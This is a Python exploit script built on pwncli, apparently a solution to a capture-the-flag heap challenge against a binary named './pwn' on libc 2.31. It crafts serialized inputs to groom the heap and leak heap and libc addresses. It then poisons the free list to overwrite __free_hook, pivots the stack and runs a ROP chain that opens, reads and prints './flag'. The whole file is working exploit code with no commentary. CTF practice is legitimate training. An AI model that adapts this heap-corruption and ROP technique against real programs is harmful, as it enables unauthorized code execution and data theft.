#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.31.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

import subprocess

def pack(choice, idx, size, data):
    with open("./tmpdata", "wb") as fd:
        fd.write(data)
    payload = subprocess.Popen(['./pack', str(choice), str(idx), str(size)],
              stdin=PIPE,
              stdout=PIPE,
              stderr=PIPE
              ).stdout.read()
    ru(b'You can try to have friendly communication with me now: \n')
    s(payload)

'''
08 choice*2
10 idx*2
18 size*2
01 22 len str
'''
def new_pack(choice, idx, size, length, data):
    payload = p8(0x08) + p8((choice*2))
    payload += p8(0x10) + p8((idx*2))
    if ((size*2) & 0xffffffffff00):
        payload += p8(0x18) + p8((size*2)&0xff) + p8(0x03)
    else:
        payload += p8(0x18) + p8(i2b(size*2)) + p8(0x01)
    payload += p8(0x22)
    if length < 0x80:
        payload += p8(length)
    else:
        payload += p8(length) + p8(0x1)
    payload += data
    ru(b'You can try to have friendly communication with me now: \n')
    s(payload)

#  pack(1, 1, 0xf0, b"a"*0xa0)
#  ia()

pack(1, 0, 0xf0, b"a")
pack(1, 1, 0xf0, b"a")
pack(1, 2, 0xf0, b"a")
pack(1, 3, 0xf0, b"a")
pack(1, 4, 0xf0, b"a")
pack(1, 5, 0xf0, b"a")
pack(1, 6, 0xf0, b"a")
pack(1, 7, 0xf0, b"a")
pack(1, 8, 0xf0, b"./flag")
for i in range(7):
    pack(4, i, 0, b"a")
pack(4, 7, 0, b"a")
pack(3, 7, 0, b"a")
rn(0x38)
heap_base = u64_ex(rn(8)) - 0xd70
lg("heap_base")
rn(0x50-0x38)
libc_base = u64_ex(rn(8)) - 0x1ecbe0
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
magic_gadget = libc_base + 0x0000000000151990
pop_rdi_ret  = libc_base + 0x0000000000023b6a
pop_rsi_ret  = libc_base + 0x000000000002601f
pop_rdx_ret  = libc_base + 0x0000000000142c92
mov_rsp_rdx  = libc_base + 0x000000000005b4d0
pop_4_ret    = libc_base + 0x000000000010feb0
lg("libc_base")
lg("magic_gadget")

payload = p64(libc_base + libc.sym["__free_hook"])
new_pack(2, 6, 0xf0, 8, payload)

payload =  p64(pop_4_ret)
payload += p64(heap_base + 0xbb0)
payload += b"a"*0x10
payload += p64(mov_rsp_rdx)
payload += p64(pop_rdi_ret) + p64(heap_base + 0xe90)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(libc_base+libc.sym.open)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(heap_base + 0xe90)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(libc_base + libc.sym.read)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(libc_base + libc.sym.write)
lg("len(payload)")

new_pack(1, 9, 0xf0, len(payload), payload)
payload = p64(magic_gadget) + p64(heap_base + 0xbb0)
payload += b"a"*0x10
payload += p64(mov_rsp_rdx)
new_pack(1, 10, 0xf0, len(payload), payload)

pack(4, 9, 0, b"a")

ia()
